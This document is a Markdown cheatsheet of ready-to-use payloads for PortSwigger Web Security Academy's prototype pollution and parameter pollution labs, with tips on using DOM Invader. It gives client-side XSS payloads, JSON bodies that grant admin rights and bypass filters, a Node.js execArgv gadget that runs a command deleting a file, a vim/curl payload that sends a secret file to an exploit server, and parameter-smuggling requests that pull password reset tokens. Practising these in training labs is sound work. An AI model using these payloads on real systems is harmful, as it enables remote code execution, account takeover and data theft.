# 🧪 Prototype & Parameter Pollution Cheatsheet

Complete exploitation methodologies, gadgets, and payload vectors for Prototype Pollution and Parameter Pollution labs in PortSwigger Web Security Academy.

> **💡Tip:** Using the **DOM Invader** tool built into Burp Browser drastically simplifies DOM-based vulnerability research. It automates source-to-sink tracking, detects prototype pollution gadgets, and generates PoC payloads instantly.

---

## ⚡ How DOM Invader Simplifies the Task

Manual testing for client-side prototype pollution and DOM XSS requires tedious analysis of obfuscated JavaScript files. **DOM Invader** eliminates this friction through:

* **Automatic Canary Tracking:** Automatically injects a unique string (canary) into query parameters, hash fragments, and form inputs to trace data flow.
* **Real-time Sink Detection:** Continuously monitors dangerous DOM sinks (`innerHTML`, `eval()`, `document.write()`, `location`) for reflected canary values.
* **One-Click Exploitation:** Analyzes the execution context and generates a working exploit payload automatically.

### Step-by-Step Workflow

1. **Enable DOM Invader:**
   * Open the built-in Burp Browser (`Proxy` -> `Open browser`).
   * Open DevTools (`F12`), navigate to the **DOM Invader** tab, and toggle the switch to **ON**.
   * Enable **Prototype Pollution** detection in the DOM Invader settings.
2. **Scan & Discover:**
   * Browse the target web application. DOM Invader automatically injects probes into parameters and tests for prototype pollution vector acceptance.
   * Check the DOM Invader tab in DevTools to see detected sources and sinks.
3. **Exploit Sinks:**
   * Click **Test** or **Exploit** next to a identified sink/gadget. DOM Invader will automatically generate and fire the context-appropriate payload (e.g., breaking out of HTML tags/quotes) to execute `alert()`.

---

## 📌 Methodology & Testing Workflow

1. **Client-Side Discovery:** Inject `__proto__[testproperty]=polluted` via URL query parameters (`?__proto__[foo]=bar`) or hash fragments (`#__proto__...`).
2. **Inspect Global Object:** Open DevTools console and check `Object.prototype.testproperty` or `window.testproperty`.
3. **Find Sink/Gadget:** Look for uninitialized object properties (e.g., `transport_url`, `hitCallback`, `value`) that execute code or manipulate DOM elements.
4. **Server-Side Discovery:** Send JSON bodies containing `"__proto__": {"json spaces": 10}` or `"constructor": {"prototype": ...}` and look for modified responses or status codes.
5. **RCE / Exfiltration:** Escalating server-side pollution to execute arbitrary commands via Node.js internal modules (`child_process`, `execArgv`, environment variables).

---

## 🛠️ Client-Side Prototype Pollution Labs

### 1. DOM XSS via Client-Side Prototype Pollution
Injecting properties via URL parameter that flows into a vulnerable JavaScript sink.

* **Payload Vector:**
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?__proto__[transport_url]=data:,alert(1)</code></pre>
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?__proto__[transport_url]=javascript:alert(1)</code></pre>

---

### 2. DOM XSS via Alternative Prototype Pollution Vector
Targeting nested objects or alternative property assignment logic (e.g., dot-notation parsing).

* **Payload Vector:**
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?__proto__.transport_url=data:,alert(1)</code></pre>

---

### 3. Client-Side Prototype Pollution via Flawed Sanitization
Bypassing simplistic key sanitization that strips `__proto__` recursively or non-recursively.

* **Payload Vector:**
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert(1)</code></pre>

---

### 4. Client-Side Prototype Pollution in Third-Party Libraries
Exploiting gadgets in common libraries like Google Analytics (`hitCallback`).

* **Payload Vector:**
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?__proto__[hitCallback]=alert(1)</code></pre>

---

### 5. Client-Side Prototype Pollution via Browser APIs
Overriding properties used by browser APIs such as `Object.defineProperty()`. Setting `configurable: true` or `writable: true` via prototype pollution allows overwriting read-only or protected properties.

* **Payload Vector:**
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?__proto__[value]=javascript:alert(1)</code></pre>

---

## 🛠️ Server-Side Prototype Pollution Labs

### 6. Privilege Escalation via Server-Side Prototype Pollution
Polluting object properties in a JSON payload to gain admin privileges during user profile updates or session processing.

* **JSON Payload:**
<pre><code>{
  "user": "wiener",
  "__proto__": {
    "isAdmin": true
  }
}</code></pre>

---

### 7. Detecting Server-Side Prototype Pollution Without Polluted Property Reflection
Detecting server-side pollution blindly by injecting Express configuration flags or options that produce observable side effects (e.g., status code changes or errors).

* **Detection Payload:**
<pre><code>{
  "__proto__": {
    "status": 510
  }
}</code></pre>

---

### 8. Bypassing Flawed Input Filters for Server-Side Prototype Pollution
Bypassing `__proto__` blacklist filters on the server by leveraging the `constructor.prototype` chain.

* **Bypass via Constructor:**
<pre><code>{
  "constructor": {
    "prototype": {
      "json spaces": 10,
      "isAdmin": true
    }
  }
}</code></pre>

---

### 9. Remote Code Execution via Server-Side Prototype Pollution
Escalating server-side pollution to RCE in Node.js applications using `child_process` execution gadgets (`execArgv` / `--require`).

* **JSON Payload:**
<pre><code>{
  "__proto__": {
    "execArgv": [
      "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
  }
}</code></pre>

---

### 10. Exfiltrating Sensitive Data via Server-Side Prototype Pollution
Triggering environment-variable overrides or command execution gadgets (e.g., via `shell` or `NODE_OPTIONS`) to leak sensitive files or environment variables to an external server.

* **JSON Payload:**
<pre><code>{
  "__proto__": {
    "shell": "vim",
    "input": ":!curl https://YOUR-EXPLOIT-SERVER.net/?data=$(cat /home/carlos/secret)\n"
  }
}</code></pre>

---

## 🛠️ Server-Side Parameter Pollution Labs

### 11. Exploiting Server-Side Parameter Pollution in a Query String
Manipulating internal backend API queries by injecting duplicate parameters, field overrides, or query string delimiters (`&`, `#`).

* **Request Payload:**
<pre><code>POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

username=administrator%26field=reset_token</code></pre>

---

### 12. Exploiting Server-Side Parameter Pollution in a REST URL
Injecting path traversal sequences (`../`) or parameter overrides into REST URL parameters processed by internal backend microservices.

* **Request Payload:**
<pre><code>POST /user/lookup HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

username=../../admin/delete#</code></pre>

---

## 🗄️ Prototype & Parameter Pollution Quick Reference

| Vulnerability Vector | Target Sink / Context | Primary Trigger / Payload Primitive | Key Exploit Objective |
| :--- | :--- | :--- | :--- |
| **Client-Side PP (DOM)** | Query string / Hash | `?__proto__[transport_url]=data:...` | DOM XSS |
| **Sanitization Bypass** | Recursive replacement | `?__pro__proto__to__[prop]=val` | Filter bypass |
| **3rd-Party Gadget** | Google Analytics | `?__proto__[hitCallback]=alert(1)` | DOM XSS via gadget |
| **Server-Side PrivEsc** | Express JSON parsing | `"__proto__": {"admin": true}` | Privilege Escalation |
| **Filter Bypass** | Key blacklist | `"constructor": {"prototype": {...}}` | Server-Side Pollution |
| **Node.js RCE** | `child_process.fork()` | `"execArgv": ["--eval=..."]` | Remote Code Execution |
| **Parameter Pollution** | Backend Query/REST | `username=admin%26field=token` | Logic Bypass / Data Leak |
